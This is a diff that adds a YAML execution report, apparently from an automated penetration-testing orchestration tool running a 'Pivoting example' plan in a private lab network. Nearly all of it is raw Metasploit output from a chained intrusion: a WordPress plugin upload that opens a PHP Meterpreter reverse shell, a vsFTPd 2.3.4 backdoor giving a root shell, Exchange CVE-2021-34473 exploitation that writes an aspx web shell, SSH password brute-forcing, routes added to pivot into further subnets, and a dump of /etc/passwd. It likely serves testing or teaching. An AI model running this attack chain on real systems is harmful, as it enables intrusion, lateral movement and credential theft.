@@ -1,0 +1,582 @@
+id: 4
+plan_id: 3
+plan_name: Pivoting example
+state: FINISHED
+schedule_time: null
+start_time: '2023-09-15T08:01:51.970039Z'
+pause_time: null
+finish_time: '2023-09-15T08:05:39.728770Z'
+plan_executions:
+- id: 4
+  plan_name: Pivoting example
+  meta: {}
+  state: FINISHED
+  schedule_time: null
+  start_time: '2023-09-15T08:01:52.024740Z'
+  finish_time: '2023-09-15T08:05:39.662399Z'
+  pause_time: null
+  worker_id: 1
+  worker_name: local_worker
+  evidence_directory: /app/evidence/run_4/worker_local_worker
+  stage_executions:
+  - id: 13
+    name: 1-wordpress-exploitation
+    meta: {}
+    state: FINISHED
+    start_time: '2023-09-15T08:01:52.272937Z'
+    pause_time: null
+    finish_time: '2023-09-15T08:02:47.131920Z'
+    schedule_time: null
+    step_executions:
+    - id: 25
+      name: upload-php-shell
+      meta: {}
+      state: FINISHED
+      start_time: '2023-09-15T08:01:52.437043Z'
+      finish_time: '2023-09-15T08:02:32.074537Z'
+      output: "[*] No payload configured, defaulting to php/meterpreter/reverse_tcp\n\
+        payload => php/meterpreter/reverse_tcp\nVERBOSE => false\nLPORT => 4444\n\
+        ReverseAllowProxy => False\nReverseListenerThreaded => False\nStagerRetryCount\
+        \ => 10\nStagerRetryWait => 5\nPingbackRetries => 0\nPingbackSleep => 30\n\
+        PayloadUUIDTracking => False\nEnableStageEncoding => False\nStageEncodingFallback\
+        \ => True\nAutoLoadStdapi => True\nAutoVerifySessionTimeout => 30\nAutoSystemInfo\
+        \ => True\nEnableUnicodeEncoding => False\nSessionRetryTotal => 3600\nSessionRetryWait\
+        \ => 10\nSessionExpirationTimeout => 604800\nSessionCommunicationTimeout =>\
+        \ 300\nAutoUnhookProcess => False\nMeterpreterDebugBuild => False\nLHOST =>\
+        \ 192.168.0.10\nVERBOSE => false\nWfsDelay => 2\nEnableContextEncoding =>\
+        \ false\nDisablePayloadHandler => false\nAllowNoCleanup => false\nRPORT =>\
+        \ 80\nSSL => false\nUserAgent => Mozilla/5.0 (Windows NT 10.0; Win64; x64)\
+        \ AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\n\
+        HttpUsername => \nHttpPassword => \nDigestAuthIIS => true\nSSLVersion => Auto\n\
+        FingerprintCheck => true\nDOMAIN => WORKSTATION\nHttpTrace => false\nHttpTraceHeadersOnly\
+        \ => false\nHttpTraceColors => red/blu\nHTTP::uri_encode_mode => hex-normal\n\
+        HTTP::uri_full_url => false\nHTTP::pad_method_uri_count => 1\nHTTP::pad_uri_version_count\
+        \ => 1\nHTTP::pad_method_uri_type => space\nHTTP::pad_uri_version_type =>\
+        \ space\nHTTP::method_random_valid => false\nHTTP::method_random_invalid =>\
+        \ false\nHTTP::method_random_case => false\nHTTP::version_random_valid =>\
+        \ false\nHTTP::version_random_invalid => false\nHTTP::uri_dir_self_reference\
+        \ => false\nHTTP::uri_dir_fake_relative => false\nHTTP::uri_use_backslashes\
+        \ => false\nHTTP::pad_fake_headers => false\nHTTP::pad_fake_headers_count\
+        \ => 0\nHTTP::pad_get_params => false\nHTTP::pad_get_params_count => 16\n\
+        HTTP::pad_post_params => false\nHTTP::pad_post_params_count => 16\nHTTP::shuffle_get_params\
+        \ => false\nHTTP::shuffle_post_params => false\nHTTP::uri_fake_end => false\n\
+        HTTP::uri_fake_params_start => false\nHTTP::header_folding => false\nTARGETURI\
+        \ => /wordpress/\nWPCONTENTDIR => wp-content\nWPCHECK => true\nRHOSTS => 192.168.0.20\n\
+        PASSWORD => wordpress\nUSERNAME => wordpress\nTARGET => 0\n[*] Started reverse\
+        \ TCP handler on 192.168.0.10:4444 \n[*] Authenticating with WordPress using\
+        \ wordpress:wordpress...\n[+] Authenticated with WordPress\n[*] Preparing\
+        \ payload...\n[*] Uploading payload...\n[*] Executing the payload at /wordpress/wp-content/plugins/hzzOPZyudx/CcvtNfNUsq.php...\n\
+        [*] Sending stage (39927 bytes) to 192.168.0.20\n[+] Deleted CcvtNfNUsq.php\n\
+        [+] Deleted hzzOPZyudx.php\n[*] Meterpreter session 1 opened (192.168.0.10:4444\
+        \ -> 192.168.0.20:54354) at 2023-09-15 08:02:28 +0000\n[!] This exploit may\
+        \ require manual cleanup of '../hzzOPZyudx' on the target\n[*] Session 1 created\
+        \ in the background.\n\n"
+      serialized_output:
+        session_id: '1'
+      result: OK
+      valid: true
+    - id: 26
+      name: create-route-to-network-1
+      meta:
+        note: If you try to add the same route (on the second run) the module will
+          fail. However, the route still exists so its fine.
+      state: FINISHED
+      start_time: '2023-09-15T08:02:32.218230Z'
+      finish_time: '2023-09-15T08:02:46.958841Z'
+      output: 'VERBOSE => false
+
+        NETMASK => 255.255.255.0
+
+        CMD => add
+
+        SUBNET => 192.168.1.0
+
+        SESSION => 1
+
+        [!] Unknown datastore option: DisablePayloadHandler.
+
+        DisablePayloadHandler => True
+
+        [!] SESSION may not be compatible with this module:
+
+        [!]  * incompatible session platform: windows
+
+        [!]  * missing Meterpreter features: stdapi_net_config_get_interfaces, stdapi_net_config_get_routes
+
+        [*] Running module against WEB-SERVER
+
+        [*] Adding a route to 192.168.1.0/255.255.255.0...
+
+        [+] Route added to subnet 192.168.1.0/255.255.255.0.
+
+        [*] Post module execution completed
+
+
+        '
+      serialized_output: {}
+      result: OK
+      valid: true
+  - id: 14
+    name: 2-ftp-exploitation
+    meta: {}
+    state: FINISHED
+    start_time: '2023-09-15T08:02:47.191586Z'
+    pause_time: null
+    finish_time: '2023-09-15T08:04:19.170749Z'
+    schedule_time: null
+    step_executions:
+    - id: 27
+      name: exploit-ftp-server
+      meta: {}
+      state: FINISHED
+      start_time: '2023-09-15T08:02:47.329299Z'
+      finish_time: '2023-09-15T08:04:03.506032Z'
+      output: 'MSF module did not finish successfully on attempt number: 1
+
+        MSF module did not finish successfully on attempt number: 2
+
+        [*] No payload configured, defaulting to cmd/unix/interact
+
+        payload => cmd/unix/interact
+
+        VERBOSE => false
+
+        CreateSession => True
+
+        AutoVerifySession => True
+
+        VERBOSE => false
+
+        WfsDelay => 2
+
+        EnableContextEncoding => false
+
+        DisablePayloadHandler => false
+
+        RPORT => 3000
+
+        SSL => false
+
+        SSLVersion => Auto
+
+        SSLVerifyMode => PEER
+
+        ConnectTimeout => 10
+
+        TCP::max_send_size => 0
+
+        TCP::send_delay => 0
+
+        RHOSTS => 192.168.1.30
+
+        TARGET => 0
+
+        [*] 192.168.1.30:3000 - Banner: 220 (vsFTPd 2.3.4)
+
+        [*] 192.168.1.30:3000 - USER: 331 Please specify the password.
+
+        [*] Exploit completed, but no session was created.
+
+
+        [*] No payload configured, defaulting to cmd/unix/interact
+
+        payload => cmd/unix/interact
+
+        VERBOSE => false
+
+        CreateSession => True
+
+        AutoVerifySession => True
+
+        VERBOSE => false
+
+        WfsDelay => 2
+
+        EnableContextEncoding => false
+
+        DisablePayloadHandler => false
+
+        RPORT => 3000
+
+        SSL => false
+
+        SSLVersion => Auto
+
+        SSLVerifyMode => PEER
+
+        ConnectTimeout => 10
+
+        TCP::max_send_size => 0
+
+        TCP::send_delay => 0
+
+        RHOSTS => 192.168.1.30
+
+        TARGET => 0
+
+        [*] 192.168.1.30:3000 - The port used by the backdoor bind listener is already
+        open
+
+        [+] 192.168.1.30:3000 - UID: uid=0(root) gid=0(root) groups=0(root)
+
+        [*] Found shell.
+
+        [*] Exploit completed, but no session was created.
+
+        [*] Command shell session 2 opened (0.0.0.0:0 -> 192.168.1.30:6200 via session
+        1) at 2023-09-15 08:03:36 +0000
+
+
+        [*] No payload configured, defaulting to cmd/unix/interact
+
+        payload => cmd/unix/interact
+
+        VERBOSE => false
+
+        CreateSession => True
+
+        AutoVerifySession => True
+
+        VERBOSE => false
+
+        WfsDelay => 2
+
+        EnableContextEncoding => false
+
+        DisablePayloadHandler => false
+
+        RPORT => 3000
+
+        SSL => false
+
+        SSLVersion => Auto
+
+        SSLVerifyMode => PEER
+
+        ConnectTimeout => 10
+
+        TCP::max_send_size => 0
+
+        TCP::send_delay => 0
+
+        RHOSTS => 192.168.1.30
+
+        TARGET => 0
+
+        [*] 192.168.1.30:3000 - The port used by the backdoor bind listener is already
+        open
+
+        [-] 192.168.1.30:3000 - The service on port 6200 does not appear to be a shell
+
+
+        '
+      serialized_output:
+        session_id: '2'
+      result: OK
+      valid: true
+    - id: 28
+      name: create-route-to-network-2
+      meta:
+        note: If you try to add the same route (on the second run) the module will
+          fail. However, the route still exists so its fine.
+      state: FINISHED
+      start_time: '2023-09-15T08:04:03.705526Z'
+      finish_time: '2023-09-15T08:04:19.034629Z'
+      output: 'VERBOSE => false
+
+        NETMASK => 255.255.255.0
+
+        CMD => add
+
+        SUBNET => 192.168.2.0
+
+        SESSION => 1
+
+        [!] Unknown datastore option: DisablePayloadHandler.
+
+        DisablePayloadHandler => True
+
+        [!] SESSION may not be compatible with this module:
+
+        [!]  * incompatible session platform: windows
+
+        [!]  * missing Meterpreter features: stdapi_net_config_get_interfaces, stdapi_net_config_get_routes
+
+        [*] Running module against WEB-SERVER
+
+        [*] Adding a route to 192.168.2.0/255.255.255.0...
+
+        [+] Route added to subnet 192.168.2.0/255.255.255.0.
+
+        [*] Post module execution completed
+
+
+        '
+      serialized_output: {}
+      result: OK
+      valid: true
+  - id: 15
+    name: 3-msf-exchange-server-exploitation
+    meta: {}
+    state: FINISHED
+    start_time: '2023-09-15T08:04:19.219258Z'
+    pause_time: null
+    finish_time: '2023-09-15T08:05:13.041157Z'
+    schedule_time: null
+    step_executions:
+    - id: 29
+      name: exploit-exchange-server
+      meta: {}
+      state: FINISHED
+      start_time: '2023-09-15T08:04:19.352989Z'
+      finish_time: '2023-09-15T08:04:57.332203Z'
+      output: "
+        [*] Started reverse TCP handler on 192.168.0.10:4444 
+        
+        [*] Running automatic check (\"set AutoCheck false\" to disable)
+        
+        [+] The target is vulnerable.
+        
+        [*] Attempt to exploit for CVE-2021-34473
+        
+        [*] Retrieving backend FQDN over RPC request
+        
+        [*] Internal server name: exchange.company.ex
+        
+        [*] Sending autodiscover request
+        
+        [*] Server: c2sb94e0-3226-3e81-2h6s-22325c756051@company.ex
+        
+        [*] LegacyDN: /o=Target Org/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=508ce51c27b544b38c33df31f99d3118-smcintyre
+        
+        [*] Sending mapi request
+        
+        [*] SID: S-1-5-21-2800676829-2777257591-1686523126-1000 (Administrator@company.ex)
+        
+        [*] Assigning the 'Mailbox Import Export' role
+        
+        [*] Writing to: C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\AnssY5TH.aspx
+        
+        [*] Waiting for the export request to complete...
+        
+        [+] The mailbox export request has completed
+        
+        [*] Triggering the payload
+        
+        [*] Sending stage (200262 bytes) to 192.168.2.40
+        
+        [+] Deleted C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\AnssY5TH.aspx
+        
+        [*] Meterpreter session 3 opened (192.168.0.10:4444 -> 192.168.2.40:6787) at 2023-09-15 08:05:07 +0000
+        
+        [*] Removing the mailbox export request
+        
+        
+        "
+      serialized_output:
+        session_id: '3'
+      result: OK
+      valid: true
+    - id: 30
+      name: create-route-to-network-3
+      meta:
+        note: If you try to add the same route (on the second run) the module will
+          fail. However, the route still exists so its fine.
+      state: FINISHED
+      start_time: '2023-09-15T08:04:57.567713Z'
+      finish_time: '2023-09-15T08:05:12.882601Z'
+      output: 'VERBOSE => false
+
+        NETMASK => 255.255.255.0
+
+        CMD => add
+
+        SUBNET => 192.168.3.0
+
+        SESSION => 1
+
+        [!] Unknown datastore option: DisablePayloadHandler.
+
+        DisablePayloadHandler => True
+
+        [!] SESSION may not be compatible with this module:
+
+        [!]  * incompatible session platform: windows
+
+        [!]  * missing Meterpreter features: stdapi_net_config_get_interfaces, stdapi_net_config_get_routes
+
+        [*] Running module against WEB-SERVER
+
+        [*] Adding a route to 192.168.3.0/255.255.255.0...
+
+        [+] Route added to subnet 192.168.3.0/255.255.255.0.
+
+        [*] Post module execution completed
+
+
+        '
+      serialized_output: {}
+      result: OK
+      valid: true
+  - id: 16
+    name: 4-ssh-exploitation
+    meta: {}
+    state: FINISHED
+    start_time: '2023-09-15T08:05:13.110150Z'
+    pause_time: null
+    finish_time: '2023-09-15T08:05:39.607933Z'
+    schedule_time: null
+    step_executions:
+    - id: 31
+      name: bruteforce-user
+      meta: {}
+      state: FINISHED
+      start_time: '2023-09-15T08:05:13.263328Z'
+      finish_time: '2023-09-15T08:05:32.461472Z'
+      output: 'VERBOSE => true
+
+        BRUTEFORCE_SPEED => 5
+
+        BLANK_PASSWORDS => false
+
+        USER_AS_PASS => false
+
+        DB_ALL_CREDS => false
+
+        DB_ALL_USERS => false
+
+        DB_ALL_PASS => false
+
+        DB_SKIP_EXISTING => none
+
+        STOP_ON_SUCCESS => true
+
+        REMOVE_USER_FILE => false
+
+        REMOVE_PASS_FILE => false
+
+        REMOVE_USERPASS_FILE => false
+
+        TRANSITION_DELAY => 0
+
+        MaxGuessesPerService => 0
+
+        MaxMinutesPerService => 0
+
+        MaxGuessesPerUser => 0
+
+        CreateSession => true
+
+        AutoVerifySession => true
+
+        THREADS => 1
+
+        ShowProgress => true
+
+        ShowProgressPercent => 10
+
+        RPORT => 22
+
+        SSH_IDENT => SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
+
+        SSH_TIMEOUT => 30
+
+        SSH_DEBUG => false
+
+        GatherProof => true
+
+        RHOSTS => 192.168.3.50
+
+        PASSWORD => victim
+
+        USERNAME => victim
+
+        [!] Unknown datastore option: DisablePayloadHandler.
+
+        DisablePayloadHandler => True
+
+        [*] 192.168.3.50:22 - Starting bruteforce
+
+        [+] 192.168.3.50:22 - Success: ''victim:victim'' ''uid=1002(victim) gid=1002(victim)
+        groups=1002(victim) Linux ssh-server 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1
+        (2021-09-29) x86_64 GNU/Linux ''
+
+        [*] SSH session 4 opened (192.168.0.10-192.168.0.20:0 -> 192.168.3.50:22)
+        at 2023-09-15 08:05:31 +0000
+
+        [*] Scanned 1 of 1 hosts (100% complete)
+
+        [*] Auxiliary module execution completed
+
+
+        '
+      serialized_output:
+        session_id: '4'
+      result: OK
+      valid: true
+    - id: 32
+      name: get-passwd-file
+      meta: {}
+      state: FINISHED
+      start_time: '2023-09-15T08:05:32.704607Z'
+      finish_time: '2023-09-15T08:05:39.460471Z'
+      output: 'root:x:0:0:root:/root:/bin/bash
+
+        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+
+        bin:x:2:2:bin:/bin:/usr/sbin/nologin
+
+        sys:x:3:3:sys:/dev:/usr/sbin/nologin
+
+        sync:x:4:65534:sync:/bin:/bin/sync
+
+        games:x:5:60:games:/usr/games:/usr/sbin/nologin
+
+        man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+
+        lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+
+        mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+
+        news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+
+        uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+
+        proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+
+        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+
+        backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+
+        list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+
+        irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+
+        gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+
+        nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+
+        _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+        systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+
+        systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+
+        systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+
+        messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+
+        sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+
+        systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+
+        debian:x:1000:1000:Debian:/home/debian:/bin/bash
+
+        user:x:1001:1001::/home/user:/bin/bash
+
+        victim:x:1002:1002::/home/victim:/bin/bash
+
+        '
+      serialized_output: {}
+      result: OK
+      valid: true
